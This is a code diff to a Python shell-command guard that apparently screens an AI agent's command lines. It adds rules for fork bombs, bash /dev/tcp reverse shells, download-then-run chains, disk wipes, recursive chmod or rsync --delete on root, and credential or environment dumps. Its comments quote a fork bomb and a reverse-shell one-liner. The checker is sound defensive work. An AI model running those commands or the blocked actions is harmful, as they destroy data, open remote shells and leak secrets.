@@ -27,6 +27,10 @@ HARDLINE_PATTERNS: list[tuple[str, str]] = [
     # `env -u X cmd` and `env -i cmd` fall through to the real command's checks, which a raw regex could not)
     ("mkfs", r"\bmkfs(?:\.\w+)?\b"),  # mkfs / mkfs.ext4 ...
     ("dd-to-device", r"\bdd\b.*\bof=/dev/"),  # dd of=/dev/...
+    # a function that pipes itself into itself in the background, however it is named (`:(){ :|:& }`, `f(){ f|f& }`)
+    ("fork-bomb", r"(?:\b(\w+)\s*\(\)\s*\{\s*\1\s*\|\s*\1\s*&\s*\}|:\s*\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\})"),
+    # bash's network redirects: the usual reverse shell (`bash -i >& /dev/tcp/HOST/PORT 0>&1`)
+    ("dev-tcp", r"[<>]&?\s*/dev/(?:tcp|udp)/"),
     ("pipe-to-shell", r"\bcurl\b[^|]*\|\s*(?:sudo\s+)?(?:sh|bash)\b"),  # curl ... | sh
     ("wget-pipe-to-shell", r"\bwget\b[^|]*-O\s*-\s*[^|]*\|\s*(?:sudo\s+)?(?:sh|bash)\b"),
     # (?i): drvfs (/mnt/c) and macOS open ~/.ssh for ~/.SSH and .env for .ENV
@@ -125,6 +129,10 @@ HARDLINE_NAMES: list[str] = [
     # rm, source, git add and --env-file ask a person)
     "sensitive-path",
     "fetch-and-run",  # a shell/interpreter running a $(...), `...` or <(...) that downloads (see _fetch_run_check)
+    "download-and-run",  # a file an earlier command of the line downloaded, run by a later one (_download_run_check)
+    "block-device-write",  # mkswap/wipefs/shred/parted... or a redirect/cp/tee onto a disk (see _block_device_check)
+    "chmod-recursive-root",  # chmod/chown/chgrp -R on /, ~ or $HOME (also chown-, chgrp-recursive-root)
+    "rsync-delete-root",  # rsync --delete into /, ~ or $HOME (see _destroy_check)
     "git-push-mirror",
     "git-push-delete-main",  # git push --delete/-d main, git push <remote> :main (see _git_push_check)
     "env-dump",  # env / printenv / export -p / set / declare -x printing the environment (see _env_dump_check)
@@ -439,10 +447,15 @@ def _check_parsed(parsed: Parsed, extra: list[str] | None, dirs: _Dirs) -> str |
     home = dirs.home
     need = {k for ks in parsed.child_subs for k in ks}
     where: dict[int, _Where] = {}  # the directories of the subs a child came from, taken at that sub
+    fetched: set[str] = set()  # files an earlier command of the line downloaded (see _download_run_check)
     for k, sub in enumerate(parsed.subs):
         if k in need:
             where[k] = dirs.where()
-        argv = _command_argv(_tokens(sub))
+        words = _tokens(sub)
+        argv = _command_argv(words)
+        # `$(echo /)` in a delete or push target is `/`: the same checks on the line with those spelled out
+        spelled = _resolve_echo(sub) if "echo" in sub else sub
+        sargv = argv if spelled == sub else _command_argv(_tokens(spelled))
         hit = (
             _match(sub, extra)
             or _match(" ".join(argv), extra)
@@ -452,9 +465,13 @@ def _check_parsed(parsed: Parsed, extra: list[str] | None, dirs: _Dirs) -> str |
             or _git_push_check(argv)
             or _env_dump_check(sub)
             or _fetch_run_check(argv, parsed.sub_payloads[k])
+            or _destroy_check(argv, words, home)
+            or _download_run_check(argv, fetched)
+            or (sargv is not argv and (_rm_check(sargv, dirs, home) or _git_push_check(sargv)))
         )
         if hit:
             return hit
+        fetched.update(_download_targets(argv, words))
         dirs.follow(argv, sub)
     hit = _pipeline_check(parsed.pipelines) or _xargs_rm_check(parsed.pipelines, dirs, home)
     if hit:
@@ -1237,8 +1254,22 @@ def _pipeline_check(pipelines: list[list[str]]) -> str | None:
             name = argv[0] if argv else ""
             if fetched and _is_interpreter(name) and _runs_stdin_as_code(argv):
                 return "pipe-to-shell"
+            if fetched and _xargs_runs_input_as_code(_tokens(stage)):
+                return "pipe-to-shell"
             fetched = fetched or name in _FETCHERS
     return None
+
+
+def _xargs_runs_input_as_code(words: list[str]) -> bool:
+    """``xargs sh -c`` with no script after the -c: xargs hands the piped text to the shell as the program."""
+    words = _strip_wrappers(words)
+    if not words or os.path.basename(words[0]) != "xargs":
+        return False
+    for i, w in enumerate(words[1:], 1):
+        if _is_interpreter(os.path.basename(w)):
+            tail = words[i + 1 :]
+            return any(a.startswith("-") and not a.startswith("--") and a.endswith("c") for a in tail[-1:])
+    return False
 
 
 def _fetch_run_check(argv: list[str], payloads: list[str]) -> str | None:
@@ -1594,6 +1625,7 @@ class _Dirs:
         self.all: dict[str | None, None] = dict.fromkeys(start)  # insertion-ordered set
         self.overflow = overflow or len(self.all) > _CD_MAX_DIRS
         self._stack: list[str | None] = []  # pushd's directory stack, for popd
+        self.known: dict[str, tuple[str, ...]] = {}  # variables the line set to a literal (see _note_vars)
 
     def where(self) -> _Where:
         return _Where(tuple(self.all), self.overflow, self.here)
@@ -1607,7 +1639,9 @@ class _Dirs:
         heres = {w.here for w in wheres}
         here = heres.pop() if len(heres) == 1 else None
         overflow = any(w.overflow for w in wheres)
-        return _Dirs(start, here, self.home, self.cdpath, overflow=overflow)
+        child = _Dirs(start, here, self.home, self.cdpath, overflow=overflow)
+        child.known = dict(self.known)
+        return child
 
     def _add(self, d: str) -> None:
         if d not in self.all:
@@ -1619,6 +1653,7 @@ class _Dirs:
     def follow(self, argv: list[str], sub: str) -> None:
         """Take in the simple command ``argv`` (read from the text ``sub``) if it changes directory (cd, pushd,
         popd)."""
+        _note_vars(self.known, _tokens(sub), argv)
         name = argv[0] if argv else ""
         if self.overflow:
             return  # every later relative delete is scan-depth: where the line goes no longer matters
@@ -1737,7 +1772,7 @@ def _rm_check(argv: list[str], dirs: _Dirs, home: str) -> str | None:
     recursive = any(t == "--recursive" or (not t.startswith("--") and ("r" in t or "R" in t)) for t in flags)
     if not recursive:
         return None
-    for t in targets:
+    for t in (r for raw in targets for r in _resolve_target(raw, dirs.known)):  # `X=/; rm -rf $X` is `rm -rf /`
         hit = _delete_rule_in(t, dirs, home)
         if hit:
             return hit
@@ -1802,6 +1837,260 @@ def _xargs_rm_check(pipelines: list[list[str]], dirs: _Dirs, home: str) -> str |
             if bad is None:
                 bad = next((w for w in argv[1:] if _delete_rule_in(w, dirs, home)), None)
     return None
+
+
+#: Whole disks and partitions (not /dev/null, /dev/zero, /dev/tty or a loop device a test image lives on).
+_BLOCK_DEVICE = re.compile(
+    r"^/dev/(?:sd[a-z]+|hd[a-z]+|vd[a-z]+|xvd[a-z]+|nvme\d+n\d+|mmcblk\d+|dm-\d+|md\d+|mapper/.+|disk/by-[\w-]+/.+)"
+    r"(?:p?\d+)?$"
+)
+#: Programs that repartition, relabel or wipe the device they are given, and the read-only options that only list it.
+_DISK_TOOLS: dict[str, frozenset[str]] = {
+    "mkswap": frozenset(),
+    "shred": frozenset(),
+    "blkdiscard": frozenset(),
+    "sfdisk": frozenset({"-l", "--list", "-s", "--show-size", "-d", "--dump", "-J", "--json", "-g", "-V", "--verify"}),
+    "fdisk": frozenset({"-l", "--list", "-s"}),
+    "gdisk": frozenset({"-l"}),
+    "sgdisk": frozenset({"-p", "--print", "-l", "--load-backup", "-E", "--end-of-largest", "-v", "--verify"}),
+}
+_PARTED_WRITES = frozenset({"mklabel", "mktable", "mkpart", "mkpartfs", "rm", "resizepart", "resize", "move", "name"})
+#: ``>``, ``>>``, ``>|``, ``<>``, ``&>``, ``2>`` and ``>&`` (an output redirect, as a lone word or glued to its target).
+_OUT_REDIRECT = re.compile(r"^(?:\d*|&)(?:>>?\|?|<>|>&)")
+#: Programs whose operands are written to: every operand (``tee``, ``truncate``) or the last (``cp``, ``mv``).
+_WRITES_ALL = frozenset({"tee", "truncate", "sponge"})
+_WRITES_LAST = frozenset({"cp", "mv", "install"})
+
+
+def _block_device_check(argv: list[str], words: list[str]) -> str | None:
+    """Output redirected onto a disk, or a program that wipes, relabels or copies onto one. ``words`` are the simple
+    command's words with the redirections still in (``argv`` is its normalised program and arguments)."""
+    for i, w in enumerate(words):
+        m = _OUT_REDIRECT.match(w)
+        if not m:
+            continue
+        target = w[m.end() :] or (words[i + 1] if i + 1 < len(words) else "")
+        if _BLOCK_DEVICE.match(target):
+            return "block-device-write"
+    if not argv:
+        return None
+    name, args = os.path.basename(argv[0]), _without_redirects(argv[1:])
+    devices = [a for a in args if _BLOCK_DEVICE.match(a)]
+    if not devices:
+        return None
+    if name in _DISK_TOOLS:
+        return None if _DISK_TOOLS[name] & set(args) else "block-device-write"
+    if name == "parted":
+        return "block-device-write" if _PARTED_WRITES & set(args) else None
+    if name == "wipefs":  # lists signatures unless told to erase them (-n / --no-act is the dry run)
+        erase = {"-a", "--all", "-o", "--offset"} & set(args)
+        return "block-device-write" if erase and not {"-n", "--no-act"} & set(args) else None
+    operands = [a for a in args if not a.startswith("-")]
+    if name in _WRITES_ALL and devices:
+        return "block-device-write"
+    if name in _WRITES_LAST and operands and _BLOCK_DEVICE.match(operands[-1]):
+        return "block-device-write"
+    return None
+
+
+def _destroy_check(argv: list[str], words: list[str], home: str) -> str | None:
+    """Recursive chmod/chown/chgrp on /, ~ or $HOME, ``rsync --delete`` into one of them, and writes onto a disk."""
+    hit = _block_device_check(argv, words)
+    if hit or not argv:
+        return hit
+    name, args = os.path.basename(argv[0]), _without_redirects(argv[1:])
+    if name in ("chmod", "chown", "chgrp"):
+        recursive = any(a == "--recursive" or (a.startswith("-") and not a.startswith("--") and "R" in a) for a in args)
+        positional = [a for a in args if not a.startswith("-")]
+        targets = positional if any(a.startswith("--reference") for a in args) else positional[1:]
+        if recursive:
+            for t in targets:
+                if t.startswith(("/", "~", "$")) and _delete_target_rule(t, None, home):
+                    return f"{name}-recursive-root"
+    elif name == "rsync" and any(a == "--del" or a.startswith("--delete") for a in args):
+        operands = [a for a in args if not a.startswith("-")]
+        dest = operands[-1] if len(operands) > 1 else ""
+        remote = ":" in dest.split("/", 1)[0]  # host:path is another machine's
+        if not remote and dest.startswith(("/", "~", "$")) and _delete_target_rule(dest, None, home):
+            return "rsync-delete-root"
+    return None
+
+
+def _download_targets(argv: list[str], words: list[str]) -> list[str]:
+    """The files a download command line writes: ``curl -o F``, ``wget -O F`` (also in a cluster, ``-qO F``) and a
+    redirect (``curl x > F``)."""
+    name = os.path.basename(argv[0]) if argv else ""
+    if name not in _FETCHERS:
+        return []
+    out: list[str] = []
+    letter = {"curl": "o", "wget": "O"}.get(name, "")
+    args = argv[1:]
+    for i, a in enumerate(args):
+        if a.startswith("--"):
+            key, eq, value = a.partition("=")
+            if key in ("--output", "--output-document"):
+                out.append(value if eq else (args[i + 1] if i + 1 < len(args) else ""))
+        elif letter and a.startswith("-") and len(a) > 1 and a.endswith(letter) and i + 1 < len(args):
+            out.append(args[i + 1])
+    for i, w in enumerate(words):
+        m = _OUT_REDIRECT.match(w)
+        if m:
+            out.append(w[m.end() :] or (words[i + 1] if i + 1 < len(words) else ""))
+    return [t for t in out if t and t != "-" and not t.startswith("&")]
+
+
+def _download_run_check(argv: list[str], fetched: set[str]) -> str | None:
+    """A later command of the same line that runs a file an earlier one downloaded (``curl -o f URL && bash f``,
+    ``wget -qO f URL; . f``, ``curl URL > f && ./f``)."""
+    if not argv or not fetched:
+        return None
+    seen = {os.path.normpath(f) for f in fetched}
+    name = os.path.basename(argv[0])
+    if _is_interpreter(name):
+        operands = [a for a in _without_redirects(argv[1:]) if not a.startswith("-")]
+        if operands and os.path.normpath(operands[0]) in seen:
+            return "download-and-run"
+    elif os.path.normpath(argv[0]) in seen:
+        return "download-and-run"
+    return None
+
+
+#: ``$(echo WORDS)`` / ```echo WORDS``` with nothing but literal words: what a delete or push really gets.
+_STATIC_ECHO = re.compile(
+    r"\$\(\s*echo\s+(?:-[neE]+\s+)*([^()$`;&|<>\"']*?)\s*\)|`\s*echo\s+(?:-[neE]+\s+)*([^`$;&|<>\"']*?)\s*`"
+)
+
+
+def _resolve_echo(sub: str) -> str:
+    return _STATIC_ECHO.sub(lambda m: m.group(1) if m.group(1) is not None else (m.group(2) or ""), sub)
+
+
+#: A whole word that is one variable, optionally followed by a path: ``$X``, ``${X}``, ``$X/build``.
+_WHOLE_VAR = re.compile(r"^\$\{?(\w+)\}?(/.*)?$")
+#: Values a variable can hold and still be read statically: literals, and $HOME / $PWD (see _delete_target_rule).
+_KNOWN_VALUE = re.compile(r"^(?:[^$`]*|\$\{?(?:HOME|PWD)\}?(?:/.*)?)$")
+
+
+def _note_vars(known: dict[str, tuple[str, ...]], tokens: list[str], argv: list[str]) -> None:
+    """Record what the simple command ``tokens`` assigns, so a later delete of ``$X`` is read as what it holds:
+    ``X=/``, ``export X=/``, ``for X in a b``. A value the shell computes (``X=$(..)``, ``for X in *``) is forgotten."""
+    words = _past_reserved(tokens)
+    while words and words[0] in ("time", "-p"):  # `time X=/` still sets X
+        words = words[1:]
+    assigns: list[str] = []
+    if words and all(_is_assignment(w) for w in words):
+        assigns = words
+    elif argv[:1] and argv[0] in ("export", "declare", "typeset", "local", "readonly"):
+        assigns = [w for w in argv[1:] if _is_assignment(w)]
+    for w in assigns:
+        name, _, value = w.partition("=")
+        if _KNOWN_VALUE.match(value):
+            known[name] = (value,)
+        else:
+            known.pop(name, None)
+    if tokens[:1] == ["for"] and len(tokens) > 3 and tokens[2] == "in" and tokens[1].isidentifier():
+        items = tokens[3:]
+        if all(_KNOWN_VALUE.match(i) and not any(c in i for c in "*?[{") for i in items):
+            known[tokens[1]] = tuple(items)
+        else:
+            known.pop(tokens[1], None)
+
+
+def _resolve_target(t: str, known: dict[str, tuple[str, ...]]) -> list[str]:
+    """``t`` with a variable it starts with replaced by every value it may hold; unchanged when it is not known."""
+    m = _WHOLE_VAR.match(t)
+    if m and m.group(1) in known:
+        return [value + (m.group(2) or "") for value in known[m.group(1)]]
+    return [t]
+
+
+#: A whole word that is one variable other than $HOME / $PWD, or a command substitution: any path.
+_BARE_EXPANSION = re.compile(r"^(?:\$\{?(?!(?:HOME|PWD)\b)\w+\}?|\$\(.*|`.*)$")
+_SECRET_VAR = re.compile(r"(?i)KEY|SECRET|TOKEN|PASSWORD|PASSWD|CREDENTIAL")
+_VAR_REF = re.compile(r"\$(?:\{(\w+)[^}]*\}|(\w+))")
+_ENV_READ = re.compile(r"environ|process\.env|\bENV\b|getenv")
+_INTERPRETER_CODE_FLAG = re.compile(r"^-[A-Za-z]*[ceEpr]$")
+
+
+def _git_sub(argv: list[str]) -> tuple[str, list[str]]:
+    """``(subcommand, arguments)`` of a ``git`` command line, past git's own options (``git -C dir reset --hard``)."""
+    if not argv or os.path.basename(argv[0]) != "git":
+        return "", []
+    i = 1
+    while i < len(argv):
+        if argv[i] in _GIT_VALUE_OPTS:
+            i += 2
+        elif argv[i].startswith("-"):
+            i += 1
+        else:
+            return argv[i], argv[i + 1 :]
+    return "", []
+
+
+def _human_sub(argv: list[str], known: dict[str, tuple[str, ...]]) -> str | None:
+    """Why a person must confirm the simple command ``argv`` (see :func:`human_check`), or None."""
+    if not argv:
+        return None
+    name = os.path.basename(argv[0])
+    sub, args = _git_sub(argv)
+    if sub == "push":
+        for a in args:
+            long_force = a.split("=", 1)[0] in ("--force", "--force-with-lease", "--force-if-includes")
+            short = a[1:] if a.startswith("-") and not a.startswith("--") else ""
+            if long_force or "f" in short or (not a.startswith("-") and a.startswith("+")):
+                return "Force-pushes, which can overwrite the remote history"
+    elif sub == "reset" and "--hard" in args:
+        return "git reset --hard discards uncommitted changes"
+    elif sub == "clean":
+        force = any(a == "--force" or (a.startswith("-") and not a.startswith("--") and "f" in a) for a in args)
+        dry = any(a == "--dry-run" or (a.startswith("-") and not a.startswith("--") and "n" in a) for a in args)
+        if force and not dry:
+            return "git clean -f deletes untracked files for good"
+    elif name == "rm":
+        flags = [t for t in argv[1:] if t.startswith("-") and t != "--"]
+        if any(t == "--recursive" or (not t.startswith("--") and ("r" in t or "R" in t)) for t in flags):
+            for t in (t for t in argv[1:] if not t.startswith("-")):
+                # `$X/build` names a place inside; a bare `$X` or `$(cmd)` can be anything
+                if any(_BARE_EXPANSION.match(r) for r in _resolve_target(t, known)):
+                    return "rm -r on a path the command line does not show"
+    elif name in ("echo", "printf", "print"):
+        for a in argv[1:]:
+            for m in _VAR_REF.finditer(a):
+                if _SECRET_VAR.search(m.group(1) or m.group(2) or ""):
+                    return "Prints a variable that holds a credential"
+    elif _is_interpreter(name) and name not in _SHELLS and name not in ("source", ".", "eval"):
+        for flag, code in zip(argv[1:], argv[2:], strict=False):
+            if _INTERPRETER_CODE_FLAG.match(flag) and _ENV_READ.search(code):
+                return "Reads the whole environment, which holds credentials"
+    return None
+
+
+def _human_parsed(parsed: Parsed, known: dict[str, tuple[str, ...]]) -> str | None:
+    for sub in parsed.subs:
+        tokens = _tokens(sub)
+        argv = _command_argv(tokens)
+        spelled = _resolve_echo(sub)  # `rm -rf $(echo build)` deletes `build`: read the line as it runs
+        hit = _human_sub(argv if spelled == sub else _command_argv(_tokens(spelled)), known)
+        if hit:
+            return hit
+        _note_vars(known, tokens, argv)
+    for child in parsed.children:
+        hit = _human_parsed(child, dict(known))
+        if hit:
+            return hit
+    return None
+
+
+def human_check(parsed: Parsed) -> str | None:
+    """Why a person must confirm the command line even though no rule forbids it, or None: force pushes, ``git reset
+    --hard``, ``git clean -f``, a recursive delete of a path only a variable names, printing a credential variable and
+    an interpreter dumping the whole environment. Not hardlines (a legitimate task does these), but nobody is asked
+    on the model's behalf: auto mode stops and asks, an unattended run is refused; yolo, which asks nothing, is not
+    consulted. ``parsed`` is the parse :func:`check_parse` returned."""
+    try:
+        return _human_parsed(parsed, {})
+    except _TooDeep:
+        return None  # check_parse refused such a line before this ran
 
 
 @dataclass
